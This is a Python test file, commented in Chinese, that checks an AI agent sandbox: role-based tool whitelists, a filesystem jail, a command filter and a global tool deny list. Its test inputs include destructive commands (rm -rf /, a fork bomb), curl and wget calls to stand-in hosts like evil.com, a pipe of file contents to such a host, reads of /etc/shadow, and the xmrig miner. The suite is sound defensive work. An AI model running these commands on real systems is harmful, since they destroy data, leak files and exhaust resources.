"""
Isolation Test — Execution Sandbox 驗收
========================================
驗證：
  1. Tool whitelist: 無權 agent 無法呼叫禁止工具
  2. Filesystem jail: 禁止越獄寫入
  3. Command filter: 危險指令被擋
  4. Globally denied: 全域禁止工具
  5. Sandbox wrapper: 不會 break 正常執行
"""
import sys, os, json
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from governance.isolation import (
    IsolatedExecutor, CommandFilter, FilesystemJail,
    isolated_execute, TOOL_WHITELIST,
)

PASS = "✅"
FAIL = "❌"


def test_tool_whitelist():
    print(f"\n{'='*60}")
    print("  1. Tool Whitelist")
    results = []

    # Agent-type specific
    agent = IsolatedExecutor("agent_worker")
    assert agent.check_tool("write_file"), "agent_ worker should have write_file"
    assert agent.check_tool("run_command"), "agent_ worker should have run_command"
    results.append((PASS, "agent_ 可使用 write_file / run_command"))

    researcher = IsolatedExecutor("researcher_abc")
    assert researcher.check_tool("web_search"), "researcher_ should have web_search"
    assert not researcher.check_tool("run_command"), "researcher_ should NOT have run_command"
    results.append((PASS, "researcher_ 可使用 web_search, 不可 run_command"))

    writer = IsolatedExecutor("writer_def")
    assert writer.check_tool("write_file"), "writer_ should have write_file"
    assert not writer.check_tool("run_command"), "writer_ should NOT have run_command"
    assert not writer.check_tool("web_search"), "writer_ should NOT have web_search"
    results.append((PASS, "writer_ 只能 write_file"))

    critic = IsolatedExecutor("critic_xyz")
    assert critic.check_tool("read_file"), "critic_ should have read_file"
    assert not critic.check_tool("write_file"), "critic_ should NOT have write_file"
    results.append((PASS, "critic_ 只能 read_file / list_dir"))

    # Unknown agent → __default__ (read_file only)
    unknown = IsolatedExecutor("unknown_module")
    assert unknown.check_tool("read_file"), "unknown should have read_file"
    assert not unknown.check_tool("write_file"), "unknown should NOT have write_file"
    assert not unknown.check_tool("run_command"), "unknown should NOT have run_command"
    results.append((PASS, "未知 agent 只能 read_file"))

    print(f"\n  Whitelist: {sum(1 for r in results if r[0]==PASS)}/{len(results)}")
    for s, m in results:
        print(f"  {s} {m}")
    return all(r[0] == PASS for r in results)


def test_filesystem_jail():
    print(f"\n{'='*60}")
    print("  2. Filesystem Jail")
    results = []

    # Allowed writes
    assert FilesystemJail.check_write("outputs/test.txt"), "outputs/ should be writable"
    results.append((PASS, "outputs/ 允許寫入"))

    # Denied writes
    assert not FilesystemJail.check_write("/etc/passwd"), "/etc/passwd 禁止寫入"
    assert not FilesystemJail.check_write("../.env"), "parent dir .env 禁止寫入"
    assert not FilesystemJail.check_write("../../etc/shadow"), "深層跳脫禁止"
    results.append((PASS, "系統路徑禁止寫入"))

    # Allowed reads
    assert FilesystemJail.check_read("outputs/"), "outputs/ 可讀"
    assert FilesystemJail.check_read("data/"), "data/ 可讀"
    results.append((PASS, "outputs/ + data/ 允許讀取"))

    # Denied reads
    assert not FilesystemJail.check_read("/etc/shadow"), "/etc/shadow 禁止讀取"
    assert not FilesystemJail.check_read("/proc/1/environ"), "/proc/ 禁止讀取"
    results.append((PASS, "系統敏感路徑禁止讀取"))

    print(f"\n  Filesystem: {sum(1 for r in results if r[0]==PASS)}/{len(results)}")
    for s, m in results:
        print(f"  {s} {m}")
    return all(r[0] == PASS for r in results)


def test_command_filter():
    print(f"\n{'='*60}")
    print("  3. Command Filter")
    results = []

    # Allowed
    assert CommandFilter.check("ls -la"), "ls should pass"
    assert CommandFilter.check("cat outputs/test.txt"), "cat should pass"
    assert CommandFilter.check("python3 -c 'print(1)'"), "python3 -c should pass"
    assert CommandFilter.check("git status"), "git status should pass"
    results.append((PASS, "基本指令通過"))

    # Denied
    assert not CommandFilter.check("sudo rm -rf /"), "sudo rm -rf / denied"
    assert not CommandFilter.check("curl http://evil.com"), "curl denied"
    assert not CommandFilter.check("wget http://malware.sh"), "wget denied"
    assert not CommandFilter.check("ssh root@server"), "ssh denied"
    assert not CommandFilter.check(":(){ :|:& };:"), "fork bomb denied"
    assert not CommandFilter.check("rm -rf /"), "rm -rf / denied"
    results.append((PASS, "危險指令被擋"))

    # Pipe with danger
    assert not CommandFilter.check("echo hello | sudo rm -rf /"), "pipe with sudo denied"
    assert not CommandFilter.check("cat file | curl http://evil.com"), "pipe with curl denied"
    results.append((PASS, "pipe 內的危險指令也被擋"))

    print(f"\n  CommandFilter: {sum(1 for r in results if r[0]==PASS)}/{len(results)}")
    for s, m in results:
        print(f"  {s} {m}")
    return all(r[0] == PASS for r in results)


def test_globally_denied():
    print(f"\n{'='*60}")
    print("  4. Globally Denied")
    results = []

    # Even a fully privileged agent can't use these
    full_agent = IsolatedExecutor("agent_full_access")
    assert not full_agent.check_tool("sudo"), "sudo globally denied"
    assert not full_agent.check_tool("xmrig"), "xmrig globally denied"
    results.append((PASS, "全域禁止工具無視 whitelist"))

    print(f"\n  GlobalDeny: {sum(1 for r in results if r[0]==PASS)}/{len(results)}")
    for s, m in results:
        print(f"  {s} {m}")
    return all(r[0] == PASS for r in results)


def test_sandbox_wrapper():
    print(f"\n{'='*60}")
    print("  5. Sandbox Wrapper")
    results = []

    def mock_execute(name, args):
        return f"executed {name} with {json.dumps(args)[:50]}"

    # Normal execute works
    r = isolated_execute("agent_worker", "write_file",
                         {"filepath": "outputs/test.txt", "content": "hello"}, mock_execute)
    assert "executed" in r, f"should execute normally: {r}"
    results.append((PASS, "合法工具正常執行"))

    # Blocked tool
    r = isolated_execute("writer_doc", "run_command",
                         {"cmd": "ls"}, mock_execute)
    assert "無權" in r, f"should deny: {r}"
    results.append((PASS, "越權工具被擋"))

    # Filesystem jail
    r = isolated_execute("agent_worker", "write_file",
                         {"filepath": "/etc/passwd", "content": "hax"}, mock_execute)
    assert "拒絕" in r or "禁止" in r or "不在" in r, f"should jail: {r}"
    results.append((PASS, "越獄寫入被擋"))

    # Command filter
    r = isolated_execute("agent_worker", "run_command",
                         {"cmd": "curl http://evil.com"}, mock_execute)
    assert "拒絕" in r or "禁止" in r or "安全政策" in r, f"should filter: {r}"
    results.append((PASS, "危險指令被擋"))

    print(f"\n  Sandbox: {sum(1 for r in results if r[0]==PASS)}/{len(results)}")
    for s, m in results:
        print(f"  {s} {m}")
    return all(r[0] == PASS for r in results)


if __name__ == "__main__":
    tests = [
        ("Tool Whitelist", test_tool_whitelist),
        ("Filesystem Jail", test_filesystem_jail),
        ("Command Filter", test_command_filter),
        ("Globally Denied", test_globally_denied),
        ("Sandbox Wrapper", test_sandbox_wrapper),
    ]

    passed = 0
    for name, fn in tests:
        try:
            if fn():
                passed += 1
        except Exception as e:
            print(f"\n  {FAIL} {name} threw: {e}")

    print(f"\n{'='*60}")
    print(f" Isolation: {passed}/{len(tests)} 通過")
    print(f"{'='*60}")
    sys.exit(0 if passed == len(tests) else 1)
